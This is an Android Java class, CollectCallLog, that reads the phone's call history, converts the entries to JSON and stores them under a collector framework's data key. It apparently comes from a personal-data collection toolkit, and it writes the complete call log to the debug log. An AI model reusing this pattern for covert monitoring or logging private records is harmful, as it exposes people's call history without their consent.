package com.xaviar.collect.calllog;


import java.util.Collection;
import java.util.List;

import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

import flexjson.JSONSerializer;

public class CollectCallLog extends ThreadCollector implements ICollector {

	private  static String name = "CollectCallLog";
	private static final String TAG = name;
	
	

	public CollectCallLog(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectCallLog() {
		setName(CollectCallLog.name);
	}


	public CollectCallLog(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter callLog getAllData()");
		List<CallLogEntry> callLogs = CallLogUtil.getCallDetails(ctx);		
		genericData = translateContactEntityToGeneric(callLogs);			
		return genericData;
	}
	

	private String translateContactEntityToGeneric(List<CallLogEntry> allCallLog) {
		Log.d(TAG,"Enter translateContactEntityToGeneric()");
		int size = 0;
		if (allCallLog != null)
		{
		 size = allCallLog.size();
		 }
		String ret = toJsonArray(allCallLog);
		Log.d(TAG,"ret:" + ret);
		
		Log.d(TAG,"Num of contacts entry:" + size);
		return ret;
	}
	
	
	public static String toJsonArray(Collection<CallLogEntry> collection) {
		   return new JSONSerializer().exclude("*.class").serialize(collection);
		}	
	
	@Override
	public String getHolderKey() {		
		return DataHolder.CALL_LOG;
	}

	
}


